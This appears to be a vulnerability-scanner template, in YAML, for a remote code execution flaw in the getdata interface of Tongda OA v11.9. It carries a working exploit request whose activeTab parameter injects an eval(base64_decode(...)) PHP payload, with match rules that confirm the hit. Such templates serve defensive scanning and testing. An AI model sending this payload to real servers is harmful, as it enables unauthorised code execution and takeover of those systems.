id: tongda-getdata-rce
brief:
    title: Tongda OA v11.9 getadata - Remote Code Execution
    by: SleepingBag945
    level: critical
    about: There is an arbitrary command execution vulnerability in the getdata interface of Tongda OA v11.9. An attacker can execute arbitrary commands on the server to control server permissions through the...
    label:
        - tongda
        - rce
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22{{base64(payload)}}%22)))%3B/*&id=19&module=Carouselimage'
      signs:
        - "on": word
          has:
            - '{{md5(num)}}'
            - pagelimit
          in: body
          need: all
        - "on": status
          status:
            - 200
